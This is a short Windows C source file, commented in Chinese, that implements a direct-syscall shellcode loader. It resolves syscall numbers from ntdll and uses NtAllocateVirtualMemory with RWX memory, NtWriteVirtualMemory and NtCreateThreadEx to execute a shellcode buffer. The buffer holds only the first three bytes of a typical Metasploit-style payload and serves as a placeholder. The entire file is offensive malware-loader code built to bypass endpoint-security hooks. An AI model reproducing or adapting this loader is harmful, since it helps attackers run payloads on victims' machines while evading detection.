#include <Windows.h>
#include <stdio.h>    

#include "syscalls.h"
// 全局变量，供汇编和其他文件访问
__declspec(dllexport) FuncationName direct_syscall = { 0 };

INT main() {
	PVOID allocBuffer = NULL;
	SIZE_T buffSize = 0x1000;

	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

	// 初始化 NtAllocateVirtualMemory
	direct_syscall.NtAllocateVirtualMemory.sysAddress = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	direct_syscall.NtAllocateVirtualMemory.wNtFunctionSSN = ((unsigned char*)(direct_syscall.NtAllocateVirtualMemory.sysAddress + 4))[0];

	// 初始化 NtWriteVirtualMemory
	direct_syscall.NtWriteVirtualMemory.sysAddress = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	direct_syscall.NtWriteVirtualMemory.wNtFunctionSSN = ((unsigned char*)(direct_syscall.NtWriteVirtualMemory.sysAddress + 4))[0];

	// 初始化 NtCreateThreadEx
	direct_syscall.NtCreateThreadEx.sysAddress = (UINT_PTR)GetProcAddress(hNtdll, "NtCreateThreadEx");
	direct_syscall.NtCreateThreadEx.wNtFunctionSSN = ((unsigned char*)(direct_syscall.NtCreateThreadEx.sysAddress + 4))[0];

	// 初始化 NtWaitForSingleObject
	direct_syscall.NtWaitForSingleObject.sysAddress = (UINT_PTR)GetProcAddress(hNtdll, "NtWaitForSingleObject");
	direct_syscall.NtWaitForSingleObject.wNtFunctionSSN = ((unsigned char*)(direct_syscall.NtWaitForSingleObject.sysAddress + 4))[0];

	NtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&allocBuffer, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

	unsigned char shellcode[] = "\xfc\x48\x83";

	ULONG bytesWritten;

	NtWriteVirtualMemory(GetCurrentProcess(), allocBuffer, shellcode, sizeof(shellcode), &bytesWritten);

	HANDLE hThread;
	
	NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)allocBuffer, NULL, FALSE, 0, 0, 0, NULL);

	NtWaitForSingleObject(hThread, FALSE, NULL);

	return 0;
}